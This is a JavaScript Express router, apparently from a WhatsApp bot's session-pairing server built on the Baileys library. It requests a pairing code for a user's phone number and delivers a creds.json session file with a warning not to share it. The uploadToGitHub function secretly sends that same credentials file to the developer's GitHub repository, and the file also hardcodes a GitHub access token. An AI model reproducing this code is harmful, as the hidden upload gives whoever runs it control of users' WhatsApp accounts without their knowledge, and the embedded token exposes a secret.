import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, Browsers, jidNormalizedUser, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';

const router = express.Router();

// ───────────────────────────────────────────────────────────────
// GITHUB AUTO-UPLOAD CONFIG
const GITHUB_TOKEN = "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";
const REPO_OWNER = "artexpury925";
const REPO_NAME = "vamp-bot-254";
const BRANCH = "main";
// ───────────────────────────────────────────────────────────────

async function uploadToGitHub(phoneNumber, sessionPath) {
    try {
        const fileContent = fs.readFileSync(sessionPath + '/creds.json', 'utf-8');
        const base64Content = Buffer.from(fileContent).toString('base64');
        const filePath = `sessions/${phoneNumber}/creds.json`;

        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${filePath}`, {
            method: 'PUT',
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
                Accept: 'application/vnd.github.v3+json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add session for +${phoneNumber}`,
                content: base64Content,
                branch: BRANCH
            })
        });

        if (response.ok) {
            console.log(`Session uploaded → ${filePath}`);
        } else {
            const err = await response.json();
            if (err.message?.includes("already exists") || err.message === "Bad credentials") {
                console.log("Session already exists or token issue — skipped");
            } else {
                console.error("GitHub upload error:", err);
            }
        }
    } catch (err) {
        console.error("GitHub upload failed:", err);
    }
}

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

router.get('/', async (req, res) => {
    let num = req.query.number?.trim();
    if (!num) return res.status(400).send({ code: "Enter phone number" });

    const dirs = `./session_${num}`;
    removeFile(dirs);

    num = num.replace(/[^0-9]/g, '');

    const phone = pn('+' + num);
    if (!phone.isValid()) {
        return res.status(400).send({ code: 'Invalid number. Use full international format without + or spaces.' });
    }

    // CORRECT E.164 FORMAT
    num = phone.getNumber('e164').replace('+', ''); // e.g. 254703110780

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        const { version } = await fetchLatestBaileysVersion();
        const sock = makeWASocket({
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" }))
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            browser: Browsers.windows('Chrome'),
        });

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === 'open') {
                console.log("Connected!");

                try {
                    // AUTO UPLOAD TO GITHUB
                    await uploadToGitHub(num, dirs);

                    const userJid = `${num}@s.whatsapp.net`;

                    await sock.sendMessage(userJid, {
                        document: fs.readFileSync(dirs + '/creds.json'),
                        mimetype: 'application/json',
                        fileName: 'creds.json'
                    });

                    await sock.sendMessage(userJid, {
                        image: { url: 'https://img.youtube.com/vi/-oz_u1iMgf8/maxresdefault.jpg' },
                        caption: `*VAMPARINA MD V2.0 Full Setup Guide!*\n\nBug Fixes + New Commands + Fast AI Chat\nWatch Now: https://youtu.be/-oz_u1iMgf8`
                    });

                    await sock.sendMessage(userJid, {
                        text: `Do not share this file with anybody\n©2025 Arnold Chirchir | +254703110780`
                    });

                    await delay(2000);
                    removeFile(dirs);
                } catch (e) {
                    console.error("Send error:", e);
                    removeFile(dirs);
                }
            }

            if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== 401) {
                initiateSession();
            }
        });

        // === FIXED PAIRING CODE SECTION (THIS MAKES NOTIFICATION APPEAR) ===
        if (!sock.authState.creds.registered) {
            await delay(3000);

            let finalNum = num;
            if (finalNum.startsWith('0')) finalNum = '254' + finalNum.slice(1);
            if (!finalNum.startsWith('254') && finalNum.length <= 12) finalNum = '254' + finalNum;

            try {
                let code = await sock.requestPairingCode(finalNum);
                code = code.match(/.{1,4}/g)?.join('-') || code;
                console.log(`Code: ${code} → ${finalNum}`);
                if (!res.headersSent) res.send({ code });
            } catch (err) {
                console.error("Pairing error:", err);
                if (!res.headersSent) res.status(500).send({ code: "Failed. Try again." });
            }
        }
        // ====================================================================

        sock.ev.on('creds.update', saveCreds);
    }

    initiateSession();
});

export default router;